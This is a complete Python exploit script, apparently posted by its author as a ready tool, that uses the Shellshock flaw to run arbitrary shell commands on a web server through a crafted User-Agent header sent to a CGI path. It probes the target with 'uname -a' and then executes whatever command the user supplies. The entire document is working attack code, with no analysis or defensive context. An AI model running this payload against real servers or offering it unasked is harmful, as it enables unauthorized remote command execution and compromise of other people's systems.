#!/bin/python3
# Title: ShellShock Remote Shell
# Author: EmanuelFirmino
# Tested on: Kali Linux / Parrot OS

import requests
import sys

# Get request with shellshock payload on User-Agent header

def exploit(url, comando):
	header = 'User-Agent'
	payload = "() { :; }; echo; echo; /bin/bash -c '"
	reqest = requests.get(url, headers = {header: payload+comando+"'"})
	return reqest.text

def main():
	if len(sys.argv) < 0b11:
		print(f'\n[*] Usage: ./{sys.argv[0b0]} [http://example.com/path/to/vulnerable/CGI/file] [Command] [*]')
		sys.exit()
	try:
		expl0it = exploit(sys.argv[0b1], 'uname -a')
		if 'Linux' not in expl0it:
			print("\n[*] Not vulnerable! [*]"); sys.exit()
		print(exploit(sys.argv[1], sys.argv[2]))	
	except KeyboardInterrupt:
		print('\n[*] Exiting... [*]')
		sys.exit()		

if __name__ == '__main__':
	main()